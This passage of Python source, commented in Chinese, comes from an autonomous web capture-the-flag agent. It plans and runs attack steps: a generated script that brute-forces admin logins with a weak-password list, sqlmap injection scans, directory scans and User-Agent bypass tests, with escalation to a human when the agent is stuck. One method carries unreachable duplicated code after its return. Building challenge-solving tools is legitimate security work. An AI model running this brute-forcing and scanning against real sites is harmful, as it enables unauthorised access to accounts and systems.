        if self._should_run_rag_before_help():
            self._run_rag_before_help(step_num)
            return None

        summary = get_memory_summary()
        help_request = self._generate_help_request(step_num, summary)
        self.memory.add_help_entry(
            request=help_request,
            reason=self.last_help_reason or "",
            step=step_num,
        )
        self._sync_agent_context()
        return help_request


    def _starting_step_num(self, resume: bool = False) -> int:
        """返回本轮主循环的起始 step 编号。"""
        if resume and self.current_step_num > 0:
            return self.current_step_num + 1
        return 1

    def _max_step_for_current_run(self, resume: bool = False) -> int:
        """返回当前主循环允许执行到的最大 step 编号。"""
        if resume:
            return max(self.max_steps, self.current_step_num + self.step_budget_limit)
        return self.max_steps

    def solve_challenge(self, url: str = "", hint: str = "", description: str = "",
                        source_code: str = "", interactive: bool = False) -> Dict[str, Any]:
        """
        全自动解题主入口

        Args:
            url: 目标URL
            hint: 题目提示
            description: 题目描述
            source_code: PHP源码（可选，用于代码分析）

        Returns:
            解题结果
        """
        self.initialize_challenge(
            url=url,
            hint=hint,
            description=description,
            source_code=source_code,
            interactive=interactive,
        )
        return self.run_main_loop()

    def run_main_loop(
        self,
        event_callback: Optional[Callable[[str, Dict[str, Any]], None]] = None,
        resume: bool = False,
    ) -> Dict[str, Any]:
        """执行唯一主循环。"""
        self._sync_agent_context()
        if not resume:
            self.help_cooldown_remaining = 0
        self.log(f"=" * 60)
        self.log(f"[Agent] 开始自动化解题: {self.target_url}")
        self.log(f"[Hint] {self.agent_context.hint}")
        if resume and getattr(self.agent_context, "human_guidance", ""):
            self.log(f"[Guidance] {self.agent_context.human_guidance}", "INFO")
        self.log(f"=" * 60)

        start_step = self._starting_step_num(resume=resume)
        max_step = self._max_step_for_current_run(resume=resume)
        for step_num in range(start_step, max_step + 1):
            self.current_step_num = step_num
            self.log(f"\n[Step {step_num}/{max_step}] ---")

            self._sync_agent_context()
            advisor_context = self.build_advisor_context()
            self._emit_event(
                event_callback,
                "advisor",
                {
                    "step": step_num,
                    "context": advisor_context,
                },
            )

            action = self.plan_next_action()
            self.log(f"决策: {action['type']}", "DECISION")
            self.memory.note_attempted_family(self._action_tactic_family(action))
            resource_source = str(action.get("resource_source") or "").strip()
            if resource_source:
                self.memory.note_resource_source_used(resource_source)

            # === Interactive Mode: 检查用户注入的 guidance ===
            if getattr(self, 'interactive', False):
                guidance = check_user_guidance()
                if guidance:
                    if guidance.get("type") == "abort":
                        write_agent_aborted("用户手动终止")
                        self.log("[Interactive] 检测到 abort 指令，终止解题", "INFO")
                        raise AgentNeedsHelpException("用户手动终止解题")
                    elif guidance.get("type") == "inject":
                        content = guidance.get("content", "")
                        self.log(f"[Interactive] 注入 guidance: {content[:100]}", "INFO")
                        # 将 guidance 注入到 agent context， planner 下一轮会消费
                        if hasattr(self.agent_context, 'human_guidance'):
                            self.agent_context.human_guidance = content
                        else:
                            setattr(self.agent_context, 'human_guidance', content)
                        self.memory.set_context(human_guidance=content)
                        self.agent_context = get_agent_context()
            self._sync_agent_context()
            self.graph_manager.apply_graph_op(
                action.get("graph_op"),
                action=action,
                step=step_num,
            )
            self._emit_event(
                event_callback,
                "planner",
                {
                    "step": step_num,
                    "action": dict(action),
                },
            )

            try:
                self._emit_event(
                    event_callback,
                    "executor",
                    {
                        "step": step_num,
                        "action": dict(action),
                    },
                )
                result = self._execute_action(action)
                self.last_result = result
                memory_step = self._latest_memory_step_for_action(action, step_num=step_num)
                action_success = self._resolve_action_success(action, default=False, step_num=step_num)
                self.graph_manager.apply_graph_op(
                    action.get("graph_op"),
                    action=action,
                    step=step_num,
                    success=action_success,
                    result=result,
                    memory_step=memory_step,
                )
                self._refresh_graph_state()
                replan_payload = dict(self.last_replan or {})
                if replan_payload:
                    self._emit_event(
                        event_callback,
                        "replan",
                        {
                            "step": step_num,
                            "reason": replan_payload.get("reason_code") or replan_payload.get("reason") or "",
                            "replan": replan_payload,
                            "action": dict(replan_payload.get("selected_alternative") or {}),
                        },
                    )
                    self.last_replan = {}
                self._emit_event(
                    event_callback,
                    "tool_node",
                    {
                        "step": step_num,
                        "action": dict(action),
                        "result": result,
                        "success": action_success,
                    },
                )
                flags = extract_flags(result)
                if flags and action_success:
                    flag = flags[0]
                    self.memory.add_flag(flag)
                    self.log(f"=" * 60)
                    self.log(f"[SUCCESS] FLAG FOUND: {flag}", "SUCCESS")
                    self.log(f"=" * 60)

                    self._auto_save_experience(flag)

                    # === Interactive Mode: 写入完成状态 ===
                    if getattr(self, 'interactive', False):
                        write_agent_completed(flag=flag, message=f"步骤{step_num}: 成功获取flag")

                    return {
                        "success": True,
                        "flag": flag,
                        "steps": step_num,
                        "message": f"步骤{step_num}: 成功获取flag"
                    }
                if flags:
                    self.log(f"[FLAG_CANDIDATE] 检测到未确认 flag 候选: {flags[0]}", "INFO")

                clues = self._analyze_output(result)
                self.log(f"发现线索: {clues}", "ANALYSIS")

                # === Interactive Mode: 写入状态 ===
                if getattr(self, 'interactive', False):
                    # 获取当前 findings
                    shared = self.graph_manager.shared_findings if hasattr(self.graph_manager, 'shared_findings') else []
                    findings = [f.get("content", str(f)) for f in shared[-5:]] if shared else []
                    total_fails = self.memory.get_failure_count() if hasattr(self.memory, 'get_failure_count') else 0
                    write_agent_status(
                        step_num=step_num,
                        action=action,
                        result=result,
                        findings=findings,
                        problem_type=self.target_type,
                        total_failures=total_fails,
                        message=f"发现线索: {clues}",
                    )

            except Exception as e:
                self.last_result = str(e)
                self.log(f"执行失败: {e}", "ERROR")
                self.memory.add_step(
                    tool=self._canonical_tool_name(action),
                    target=action.get("target", self.target_url),
                    params={},
                    result=str(e),
                    success=False,
                    action_meta=self._build_memory_action_meta(action),
                )
                self.graph_manager.apply_graph_op(
                    action.get("graph_op"),
                    action=action,
                    step=step_num,
                    success=False,
                    result=str(e),
                    memory_step=self._latest_memory_step_for_action(action, step_num=step_num),
                )
                self._refresh_graph_state()
                self._emit_event(
                    event_callback,
                    "tool_node",
                    {
                        "step": step_num,
                        "action": dict(action),
                        "result": str(e),
                        "success": False,
                    },
                )
                # === Interactive Mode: 写入失败状态 ===
                if getattr(self, 'interactive', False):
                    shared = self.graph_manager.shared_findings if hasattr(self.graph_manager, 'shared_findings') else []
                    findings = [f.get("content", str(f)) for f in shared[-5:]] if shared else []
                    write_agent_status(
                        step_num=step_num,
                        action=action,
                        result=str(e),
                        findings=findings,
                        problem_type=self.target_type,
                        total_failures=1,
                        message=f"执行失败: {e}",
                    )

            help_request = self.maybe_request_help(step_num)
            if help_request:
                self.log("=" * 60)
                self.log("[AGENT] 无法继续，需要人类干预！", "HELP")
                self.log("=" * 60)
                self.graph_manager.apply_graph_op(
                    self.graph_manager.build_checkpoint_graph_op(
                        "help",
                        action=action,
                        reason=self.last_help_reason or "",
                    ),
                    action=action,
                    step=step_num,
                    message=help_request,
                    reason=self.last_help_reason or "",
                )
                self._refresh_graph_state()
                self._emit_event(
                    event_callback,
                    "help",
                    {
                        "step": step_num,
                        "message": help_request,
                        "reason": self.last_help_reason,
                    },
                )

                raise AgentNeedsHelpException(help_request)

        final_help = (
            f"已尝试{max_step}步仍未获得flag，所有自动策略均已失败。\n\n"
            f"最终状态:\n{get_memory_summary()}"
        )
        self.graph_manager.apply_graph_op(
            self.graph_manager.build_checkpoint_graph_op(
                "help",
                action=self.last_action,
                reason="max_steps",
            ),
            action=self.last_action,
            step=max_step,
            message=final_help,
            reason="max_steps",
        )
        self._refresh_graph_state()
        self._emit_event(
            event_callback,
            "help",
            {
                "step": max_step,
                "message": final_help,
                "reason": "max_steps",
            },
        )
        raise AgentNeedsHelpException(final_help)

    def reset(self):
        """重置Agent状态"""
        reset_memory()
        self.memory = get_memory()
        self.agent_context = get_agent_context()
        self.init_result = {}
        self.target_url = ""
        self.target_type = "unknown"
        self.problem_classified = False
        self.current_step_num = 0
        self.last_action = {}
        self.last_result = ""
        self.source_code = ""
        self.source_analysis_result = None
        self.attack_plan = None
        self.consecutive_help_triggers = 0
        self.last_help_reason = None
        self.help_cooldown_remaining = 0
        self.step_budget_limit = self.max_steps
        self.graph_manager.reset()

    def _hint_indicates_info_leak(self, hint: str) -> bool:
        hint_lower = str(hint or "").lower()
        return any(token in hint_lower for token in ["phpinfo", ".git", "git泄露", "git 泄露", "源码泄露", "信息泄露", "配置泄露"])

    def _classify_problem(self, hint: str):
        """基于 hint 的轻量兜底分类；仅用于增强低置信初始化结果。"""
        hint_lower = hint.lower()
        if self._hint_indicates_info_leak(hint):
            self.log("题目提示更偏向信息泄露/仓库泄露，保留初始化分类结果", "ANALYSIS")
            return None

        hinted_type = None
        if any(k in hint_lower for k in ["手机", "mobile", "ua", "user-agent", "安卓", "android", "iphone"]):
            hinted_type = "ua_bypass"
        elif any(k in hint_lower for k in ["sql", "注入", "database", "mysql"]):
            hinted_type = "sqli"
        elif any(k in hint_lower for k in ["file", "文件", "包含", "include", "lfi", "path"]):
            hinted_type = "lfi"
        elif any(k in hint_lower for k in ["rce", "命令", "执行", "exec", "shell", "system"]):
            hinted_type = "rce"
        elif any(k in hint_lower for k in ["ssrf", "内网", "gopher", "file://", "curl"]):
            hinted_type = "ssrf"

        if hinted_type:
            self.log(f"题目提示兜底识别: {hinted_type}", "ANALYSIS")
        return hinted_type

    def _analyze_source_code(self, code: str) -> str:
        """
        分析PHP源码，识别漏洞和攻击链

        Args:
            code: PHP源代码

        Returns:
            分析结果文本
        """
        if not SOURCE_ANALYSIS_AVAILABLE:
            return "[Warning] Source analyzer not available"

        self.log("[Analysis] 分析PHP源码中...", "ANALYSIS")

        result = analyze_php(code)
        self.source_analysis_result = result

        # 格式化输出
        output = []
        output.append(f"\n{'='*60}")
        output.append(f"[Source Analysis] Vulnerability Type: {result.vuln_type}")
        output.append(f"{'='*60}")

        # 发现的模式
        output.append(f"\n[Detected Patterns] {len(result.patterns)} found:")
        for p in result.patterns:
            output.append(f"  • {p.name}: {p.description}")
            output.append(f"    Severity: {p.severity}, Confidence: {p.confidence}")

        # 类信息
        for cls in result.class_info:
            output.append(f"\n[Class] {cls.name}")
            output.append(f"  Magic methods: {', '.join(cls.magic_methods)}")
            output.append(f"  Dangerous calls: {[c['function'] for c in cls.dangerous_calls]}")
            output.append(f"  Controllable properties: {cls.controlled_properties}")

        # 攻击链
        if result.attack_chain:
            self.target_type = "deserialization"  # 根据分析结果更新类型
            output.append(f"\n[Attack Chain Detected!]")
            for step in result.attack_chain:
                output.append(f"  → {step}")
            self.log("[SUCCESS] Attack chain identified!")

        # POC建议
        if result.suggested_poc:
            output.append(f"\n[Suggested POC Generated]")
            output.append(result.suggested_poc[:500] + "...")

        output.append(f"{'='*60}\n")

        analysis_text = '\n'.join(output)
        self.log(analysis_text)
        return analysis_text

    def _auth_progress_state(self) -> Dict[str, Any]:
        signals = self.graph_manager.planner_signals()
        known_endpoints = list(signals.get("known_endpoints") or [])
        known_parameters = list(signals.get("known_parameters") or [])
        steps = list(self.memory.steps or [])

        # weak_creds_attempted: POC 类型尝试过弱口令
        weak_creds_attempted = any(
            step.action_type == "poc" and (step.canonical_tool or step.tool) == "python_poc"
            for step in steps
        )

        # endpoint_enum_attempted: 应该检查是否有针对登录端点的 recon 或 POC 尝试
        endpoint_enum_attempted = any(
            step.action_type in ("recon", "poc") and
            (step.canonical_tool or step.tool) in ("recon", "python_poc") and
            any(token in str(getattr(step, "result", "") or "").lower() for token in ["login", "form", "auth", "check"])
            for step in steps
        )

        # endpoint_enum_confirmed: 确认找到登录表单端点
        endpoint_enum_confirmed = any(
            any(token in str(getattr(step, "result", "") or "").lower() for token in ["found login form endpoint", "form method:", "form field:"])
            or any("login form endpoint" in str(item).lower() or "form method" in str(item).lower() or "form field" in str(item).lower() for item in list(getattr(step, "key_findings", []) or []))
            for step in steps
        )

        # structured_auth_signal 需要更严格：必须有确认的 endpoint 或多个参数
        structured_auth_signal = bool(endpoint_enum_confirmed) or (bool(known_endpoints) and len(known_parameters) >= 2)
        if not weak_creds_attempted:
            stage = "weak-creds"
        elif not endpoint_enum_attempted or not structured_auth_signal:
            stage = "endpoint-enum"
        elif structured_auth_signal:
            stage = "auth-sqli"
        else:
            stage = "endpoint-enum"
        return {
            "stage": stage,
            "weak_creds_attempted": weak_creds_attempted,
            "endpoint_enum_attempted": endpoint_enum_attempted,
            "endpoint_enum_confirmed": endpoint_enum_confirmed,
            "structured_auth_signal": structured_auth_signal,
            "known_endpoints": known_endpoints,
            "known_parameters": known_parameters,
        }

        endpoint_text = str(endpoint or "").strip()
        if not endpoint_text:
            return self.target_url
        if endpoint_text.startswith(("http://", "https://")):
            return endpoint_text
        base = self.target_url or getattr(self.agent_context, "url", "") or ""
        if not base:
            return endpoint_text
        return urljoin(base.rstrip("/") + "/", endpoint_text.lstrip("/"))

    def _target_with_endpoint(self, endpoint: str) -> str:
        endpoint_text = str(endpoint or "").strip()
        if not endpoint_text:
            return self.target_url
        if endpoint_text.startswith(("http://", "https://")):
            return endpoint_text
        base = self.target_url or getattr(self.agent_context, "url", "") or ""
        if not base:
            return endpoint_text
        return urljoin(base.rstrip("/") + "/", endpoint_text.lstrip("/"))

    def _build_graph_informed_action(self, replan: Optional[Dict[str, Any]] = None) -> Optional[Dict[str, Any]]:
        candidates = self._collect_graph_informed_actions(replan=replan)
        if not candidates:
            return None
        return dict(candidates[0])

    def _decide_next_action(self) -> Dict[str, Any]:
        """
        决策下一步行动

        核心：优先执行攻击计划（如果有），否则尝试 AI 决策，最后基于启发式决策
        """
        steps = self.memory.steps
        target = self.target_url

        # === 新增：AI 决策尝试 ===
        # 优先尝试 AI 决策
        ai_decision = self._try_ai_decision()
        if ai_decision is not None:
            self.log(f"[AI Decision] tool={ai_decision.get('tool')}, target={ai_decision.get('target')}, reason={ai_decision.get('reason', '')}", "AI")
            action = self._build_action_from_ai_decision(ai_decision)
            if action is not None:
                return action
        # === AI 决策结束 ===

        if self.attack_plan:
            next_step = self.attack_plan.get_next_step()
            if next_step:
                self.log(f"[AttackPlan] Executing: {next_step.name}", "PLAN")
                return self._build_action(
                    "attack_step",
                    target=target,
                    description=next_step.description,
                    intent=f"执行攻击计划步骤 {next_step.name}",
                    expected_tool="attack_step",
                    params={"code": next_step.code},
                    metadata={
                        "step_name": next_step.name,
                        "code": next_step.code,
                    },
                )
            self.log("[AttackPlan] All steps completed")

        if self.source_analysis_result and not any(s.tool == "source_analysis" for s in steps):
            return self._build_action(
                "source_analysis",
                target="PHP code",
                description="分析已提供源码",
                intent="基于源码提取漏洞线索",
                expected_tool="source_analysis",
                params={"code": self.source_code},
                metadata={"code": self.source_code},
            )

        if not steps:
            return self._build_action(
                "recon",
                target=target,
                description="初始信息收集",
                intent="收集首页响应、头和可能的跳转信息",
                expected_tool="recon",
            )

        if self.target_type == "auth":
            auth_state = self._auth_progress_state()
            login_endpoints = [ep for ep in self.memory.target.endpoints if any(token in ep.lower() for token in ["check", "login", "signin", "auth"])]
            login_params = [p for p in self.memory.target.parameters if p.lower() in ["u", "p", "username", "password", "user", "pass", "email"]]
            endpoint = login_endpoints[0] if login_endpoints else "check.php"
            param_u = login_params[0] if login_params else "u"
            param_p = login_params[1] if len(login_params) > 1 else "p"
            poc_steps = [s for s in steps if s.action_type == "poc" or (s.expected_tool == "python_poc" and s.action_type in {"poc", "recon"})]
            has_successful_poc = any(step.success for step in poc_steps)
            recent_auth_recon = [s for s in steps[-3:] if s.action_type == "recon" and (s.canonical_tool or s.tool) == "python_poc"]
            auth_stage = auth_state.get("stage") or "weak-creds"

            if auth_stage == "weak-creds" and not has_successful_poc:
                brute_code = f'''\
import requests
import sys

target = "{target.rstrip('/')}/{endpoint}"
passwords = ["admin888", "admin", "password", "123456", "12345678", "1234", "admin123", "root", "toor", "ctfshow", "flag"]

for pwd in passwords:
    try:
        resp = requests.post(target, data={{"{param_u}": "admin", "{param_p}": pwd}}, verify=False, timeout=10)
        if "error" not in resp.text.lower() and resp.text.strip():
            print(f"[SUCCESS] Found password: {{pwd}}")
            print(f"Response: {{resp.text[:500]}}")
            sys.exit(0)
        else:
            print(f"[FAIL] {{pwd}}")
    except Exception as e:
        print(f"[ERROR] {{pwd}}: {{e}}")

print("No valid password found")
'''
                return self._build_action(
                    "poc",
                    target=target,
                    description="针对登录端点尝试暴力破解",
                    intent="使用常见弱口令尝试登录绕过",
                    expected_tool="python_poc",
                    params={"code": brute_code, "endpoint": endpoint, "login_params": [param_u, param_p]},
                    metadata={
                        "attack_type": "auth_bypass",
                        "auth_endpoints": login_endpoints,
                        "auth_login_params": login_params,
                        "tactic_family": "weak-creds",
                    },
                )

            graph_action = self._build_graph_informed_action()
            if graph_action is not None and graph_action.get("type") != "dir_scan":
                return graph_action

            if auth_stage == "endpoint-enum":
                return self._build_action(
                    "recon",
                    target=target,
                    description="围绕认证入口继续枚举与分支确认",
                    intent="补齐 auth family: endpoint-enum",
                    expected_tool="recon",
                    params={"focus": "auth-endpoints", "known_endpoints": login_endpoints},
                    metadata={"tactic_family": "endpoint-enum"},
                )

            if auth_stage == "auth-sqli":
                return self._build_action(
                    "sqlmap_scan",
                    target=target,
                    description="基于已确认认证入口尝试参数注入验证",
                    intent="auth family 已完成入口确认，切到 auth-sqli 验证",
                    expected_tool="sqlmap",
                    params={"batch": True},
                    metadata={"tactic_family": "auth-sqli"},
                )

            if not recent_auth_recon:
                return self._build_action(
                    "recon",
                    target=target,
                    description="围绕认证入口继续枚举与分支确认",
                    intent="补齐 auth family: endpoint-enum",
                    expected_tool="recon",
                    params={"focus": "auth-endpoints", "known_endpoints": login_endpoints},
                    metadata={"tactic_family": "endpoint-enum"},
                )

            return self._build_action(
                "recon",
                target=target,
                description="auth 攻击未成功，继续信息收集",
                intent="重新采样响应并寻找其他 auth 突破口",
                expected_tool="recon",
                params={"focus": "auth-followup", "known_endpoints": login_endpoints},
                metadata={"tactic_family": "endpoint-enum"},
            )

        graph_action = self._build_graph_informed_action()
        if graph_action is not None:
            return graph_action

        if self.target_type == "ua_bypass":
            if not any(s.tool in {"ua_test", "python_poc"} and "Mobile" in str(s.result) for s in steps):
                return self._build_action(
                    "ua_test",
                    target=target,
                    description="测试Mobile UA",
                    intent="验证目标是否依赖 User-Agent 分支",
                    expected_tool="ua_test",
                    params={"ua": "Mobile"},
                    metadata={"ua": "Mobile"},
                )
            last_step = steps[-1]
            if "301" in str(last_step.result) or "302" in str(last_step.result):
                redirect_url = self._extract_redirect(last_step.result)
                if redirect_url:
                    redirect_target = f"{target.rstrip('/')}/{redirect_url.lstrip('/')}"
                    return self._build_action(
                        "follow_redirect",
                        target=redirect_target,
                        description="跟随重定向",
                        intent="访问重定向位置继续验证 UA 绕过",
                        expected_tool="follow_redirect",
                        params={"ua": "Mobile"},
                        metadata={"ua": "Mobile"},
                    )

        if self.target_type == "sqli":
            if not any(s.tool == "sqlmap" for s in steps):
                return self._build_action(
                    "sqlmap_scan",
                    target=target,
                    description="检测SQL注入点",
                    intent="先用 sqlmap 做基础注入检测",
                    expected_tool="sqlmap",
                    params={"batch": True},
                )
            if any(s.tool == "sqlmap" and not s.success for s in steps[-2:]):
                graph_action = self._build_graph_informed_action()
                if graph_action is not None and graph_action.get("type") != "dir_scan":
                    return graph_action
                return self._build_action(
                    "dir_scan",
                    target=target,
                    description="补充目录扫描",
                    intent="收集更多端点后再决定注入路径",
                    expected_tool="dirsearch",
                    params={"extensions": ["php", "txt", "bak"]},
                )

        recent_dir_scans = [s for s in steps[-4:] if (s.canonical_tool or s.tool) == "dirsearch"]
        repeated_dir_scan_without_new_findings = (
            len(recent_dir_scans) >= 2
            and all(not step.key_findings for step in recent_dir_scans)
        )
        low_yield_stats = self._recent_low_yield_probe_stats(window=5)
        low_yield_probe_loop = (
            low_yield_stats["low_yield_count"] >= 3
            and low_yield_stats["repeated_current_target_count"] >= 2
        )
        dir_scan_stuck_loop = (
            low_yield_stats.get("repeated_dir_scan_without_findings", 0) >= 2
            and low_yield_stats.get("repeated_current_target_count", 0) >= 2
        )

        if steps and not steps[-1].success:
            fail_count = self.memory.fail_count_for_step(steps[-1])
            if fail_count >= 2:
                graph_action = self._build_graph_informed_action()
                if graph_action is not None and (
                    graph_action.get("type") != "dir_scan" or not repeated_dir_scan_without_new_findings
                ):
                    return graph_action
                if self.target_type == "auth":
                    return self._build_action(
                        "recon",
                        target=target,
                        description="auth 分支受阻后继续认证入口确认",
                        intent="避免 auth 场景退化到通用目录扫描，优先继续围绕认证入口改路",
                        expected_tool="recon",
                        params={"focus": "auth-recover"},
                        metadata={"tactic_family": "endpoint-enum", "alternative": True, "reason": "auth-fallback-no-dirscan"},
                    )
                if dir_scan_stuck_loop:
                    return self._build_action(
                        "recon",
                        target=target,
                        description="目录扫描无增益，切回侦察分支",
                        intent="避免重复 dir_scan 空转，转向可产生新 finding 的轻量验证",
                        expected_tool="recon",
                        params={"focus": "break-dir-scan-loop"},
                        metadata={"alternative": True, "reason": "dir_scan_stuck_loop"},
                    )
                if not repeated_dir_scan_without_new_findings and not low_yield_probe_loop:
                    # For auth targets, prefer recon to avoid falling back to generic dir_scan
                    if self.target_type == "auth":
                        return self._build_action(
                            "recon",
                            target=target,
                            description="auth 目标避免退化到目录扫描",
                            intent="继续围绕认证入口收集线索",
                            expected_tool="recon",
                            params={"focus": "auth-recover"},
                            metadata={"tactic_family": "endpoint-enum", "alternative": True, "reason": "auth-no-dirscan"},
                        )
                    return self._build_action(
                        "dir_scan",
                        target=target,
                        description="当前方法多次失败，改做目录探索",
                        intent="切换到不同工具获取新线索",
                        expected_tool="dirsearch",
                        params={"extensions": ["php", "html", "txt"]},
                        metadata={"alternative": True},
                    )

        graph_action = self._build_graph_informed_action()
        if graph_action is not None and (
            graph_action.get("type") != "dir_scan" or not repeated_dir_scan_without_new_findings
        ):
            return graph_action

        if dir_scan_stuck_loop:
            return self._build_action(
                "recon",
                target=target,
                description="目录扫描无增益，切回侦察分支",
                intent="避免重复 dir_scan 空转，转向可产生新 finding 的轻量验证",
                expected_tool="recon",
                params={"focus": "break-dir-scan-loop"},
                metadata={"alternative": True, "reason": "dir_scan_stuck_loop"},
            )

        if low_yield_probe_loop:
            # For auth targets, prefer recon to avoid degenerating to generic dir_scan
            if self.target_type == "auth":
                return self._build_action(
                    "recon",
                    target=target,
                    description="auth 场景轻量探测低收益，切换到认证入口相关侦察",
                    intent="避免 auth 目标退化到通用目录扫描，继续围绕认证入口寻找线索",
                    expected_tool="recon",
                    params={"focus": "auth-recover"},
                    metadata={"tactic_family": "endpoint-enum", "alternative": True, "reason": "auth-low-yield-recover"},
                )
            return self._build_action(
                "dir_scan",
                target=target,
                description="轻量探测低收益，切换目录探索",
                intent="避免围绕同一目标重复轻量探测，改用目录扫描寻找新线索",
                expected_tool="dirsearch",
                params={"extensions": ["php", "html", "txt"]},
                metadata={"alternative": True, "reason": "low_yield_probe_loop"},
            )

        return self._build_action(
            "recon",
            target=target,
            description="继续信息收集",
            intent="重新采样响应并寻找新的利用线索",
            expected_tool="recon",
        )

    def _is_low_yield_step(self, step: Any) -> bool:
        result_text = str(getattr(step, "result", "") or "").strip()
        key_findings = list(getattr(step, "key_findings", []) or [])
        target = str(getattr(step, "target", "") or "").strip()
        canonical_tool = str(getattr(step, "canonical_tool", "") or getattr(step, "tool", "") or "").strip()
        return (
            canonical_tool in {"recon", "dirsearch", "ua_test", "follow_redirect"}
            and not key_findings
            and not getattr(step, "success", False)
            and bool(target)
            and bool(result_text)
        )

    def _recent_low_yield_probe_stats(self, window: int = 5) -> Dict[str, Any]:
        recent_steps = self.memory.steps[-window:] if window > 0 else self.memory.steps
        same_target_counts: Dict[str, int] = {}
        low_yield_steps = []
        low_yield_dir_scan_count = 0
        repeated_dir_scan_without_findings = 0
        for step in recent_steps:
            if not self._is_low_yield_step(step):
                continue
            low_yield_steps.append(step)
            target = str(step.target or "").strip()
            same_target_counts[target] = same_target_counts.get(target, 0) + 1
            canonical_tool = str(getattr(step, "canonical_tool", "") or getattr(step, "tool", "") or "").strip()
            if canonical_tool == "dirsearch":
                low_yield_dir_scan_count += 1
                if not list(getattr(step, "key_findings", []) or []):
                    repeated_dir_scan_without_findings += 1
        repeated_target = max(same_target_counts.values(), default=0)
        repeated_current_target = same_target_counts.get(str(self.target_url or "").strip(), 0)
        return {
            "low_yield_steps": low_yield_steps,
            "low_yield_count": len(low_yield_steps),
            "same_target_counts": same_target_counts,
            "repeated_target_count": repeated_target,
            "repeated_current_target_count": repeated_current_target,
            "low_yield_dir_scan_count": low_yield_dir_scan_count,
            "repeated_dir_scan_without_findings": repeated_dir_scan_without_findings,
        }

    def _execute_action(self, action: Dict[str, Any]) -> str:
        """执行标准化动作。"""
        action_type = action.get("type", "unknown")
        handler = self.action_handlers.get(action_type)
        if not handler:
            return self._build_executor_error(action, f"unknown action type: {action_type}")

        result = handler(action)
        if action_type == "attack_step" and not result.startswith("[attack_step]"):
            self._mark_action_completed(action, result)
        return result

    def _try_common_bypasses(self, target: str) -> str:
        """尝试常见的绕过方法"""
        return "尝试其他方法..."

    def _analyze_output(self, output: str) -> List[str]:
        """分析输出发现线索"""
        clues = []

        if "301" in output or "302" in output:
            clues.append("redirect")

        if "User-Agent" in output and "Mobile" in output:
            clues.append("ua_sensitive")

        urls = re.findall(r'/(\w+\.html?|\w+\.php)', output)
        if urls:
            clues.append(f"new_endpoint: {urls}")

        return clues

    def _extract_redirect(self, result: str) -> Optional[str]:
        """从重定向响应中提取目标URL"""
        match = re.search(r'Redirect to?:?\s*(.+)', result)
        if match:
            return match.group(1).strip().replace('/', '')
        return None

    def _analyze_failures(self) -> Dict[str, int]:
        """分析最近失败的模式"""
        fail_types = {
            "payload_error": 0,
            "execution_error": 0,
            "same_error": 0,
            "timeout": 0,
        }

        failed_steps = [s for s in self.memory.steps if not s.success][-5:]
        error_signatures: List[str] = []

        for step in failed_steps:
            result_text = str(step.result or "")
            lower_result = result_text.lower()

            if any(keyword in lower_result for keyword in ["syntax", "parse", "invalid", "unexpected"]):
                fail_types["payload_error"] += 1

            if any(keyword in lower_result for keyword in ["timeout", "time out", "connection", "network", "reset", "refused"]):
                fail_types["execution_error"] += 1
                fail_types["timeout"] += 1
            elif any(keyword in lower_result for keyword in ["error", "exception", "failed", "denied"]):
                fail_types["execution_error"] += 1

            error_signatures.append(lower_result[:120])

        if error_signatures:
            unique_ratio = len(set(error_signatures)) / len(error_signatures)
            if unique_ratio <= 0.5:
                fail_types["same_error"] = len(error_signatures)

        return fail_types

    def _auto_adjust_strategy(self, failure_analysis: Dict[str, int]):
        """根据失败分析自动微调策略"""
        if failure_analysis.get("payload_error", 0) >= 2:
            self.log("[STRATEGY] Payload syntax issues detected, switching payload template", "INFO")

        if failure_analysis.get("timeout", 0) >= 2:
            self.log("[STRATEGY] Multiple timeouts detected, increasing timeout budget", "INFO")

        if failure_analysis.get("same_error", 0) >= 2:
            self.log("[STRATEGY] Repeated identical error, forcing action diversification", "INFO")

    def _recent_action_failure_counts(self, window: int = 5) -> Dict[str, Any]:
        recent_steps = self.memory.steps[-window:] if window > 0 else self.memory.steps
        action_ids = {
            step.action_id
            for step in recent_steps
            if not step.success and step.action_id
        }
        action_types = {
            step.action_type or step.expected_tool or step.tool
            for step in recent_steps
            if not step.success and (step.action_type or step.expected_tool or step.tool)
        }
        canonical_tools = {
            step.canonical_tool or step.tool
            for step in recent_steps
            if not step.success and (step.canonical_tool or step.tool)
        }
        return {
            "recent_steps": recent_steps,
            "distinct_actions": len(action_ids),
            "distinct_action_types": len(action_types),
            "action_id_counts": {
                action_id: self.memory.action_fail_count(action_id)
                for action_id in action_ids
            },
            "action_type_counts": {
                action_type: sum(
                    1
                    for step in self.memory.steps
                    if not step.success and (step.action_type or step.expected_tool or step.tool) == action_type
                )
                for action_type in action_types
            },
            "canonical_tool_counts": {
                tool: self._count_recent_failures_by_tool(tool, window=window)
                for tool in canonical_tools
            },
        }

    def _should_ask_for_help(self) -> bool:
        if self.help_cooldown_remaining > 0:
            self.help_cooldown_remaining -= 1
            self.log("[FAIL_ANALYSIS] Resume cooldown active, delaying help escalation", "INFO")
            return False

        steps = self.memory.steps
        if not steps:
            return False

        total_steps = len(steps)
        consecutive_failures = 0
        for step in reversed(steps):
            if step.success:
                break
            consecutive_failures += 1

        recent_failure_stats = self._recent_action_failure_counts(window=5)
        readiness = self._help_readiness()
        self.memory.set_help_readiness_reason(str(readiness.get("reason") or ""))
        if not readiness.get("ready"):
            reason = str(readiness.get("reason") or "")
            if reason == "rag_not_attempted":
                self.last_help_reason = reason
                self.log("[FAIL_ANALYSIS] Trigger pre-help RAG before escalation", "INFO")
                return True
            if reason == "need_more_rounds" and self._should_run_rag_before_help() and self._get_consecutive_failures() >= self.max_failures:
                self.memory.set_help_readiness_reason("rag_not_attempted")
                self.last_help_reason = "rag_not_attempted"
                self.log("[FAIL_ANALYSIS] Help delayed until pre-help RAG runs", "INFO")
                return True
            self.log(f"[FAIL_ANALYSIS] Help gate delayed: {reason}", "INFO")
            self.last_help_reason = reason
            return False
        if total_steps >= 5 and recent_failure_stats["distinct_actions"] <= 2 and recent_failure_stats["distinct_action_types"] <= 2:
            if self.target_type == "auth":
                auth_progress_markers = 0
                for step in steps:
                    text = str(getattr(step, "result", "") or "").lower()
                    findings = list(getattr(step, "key_findings", []) or [])
                    if any(marker in text for marker in ["found login form endpoint", "form method:", "form field:"]):
                        auth_progress_markers += 1
                    elif any("login form endpoint" in str(item).lower() or "form method" in str(item).lower() for item in findings):
                        auth_progress_markers += 1
                if auth_progress_markers <= 0:
                    self.log("[FAIL_ANALYSIS] Limited action diversity, forcing replanning", "FAIL")
                    self.last_help_reason = "limited_diversity"
                    return True
            else:
                self.log("[FAIL_ANALYSIS] Limited action diversity, forcing replanning", "FAIL")
                self.last_help_reason = "limited_diversity"
                return True

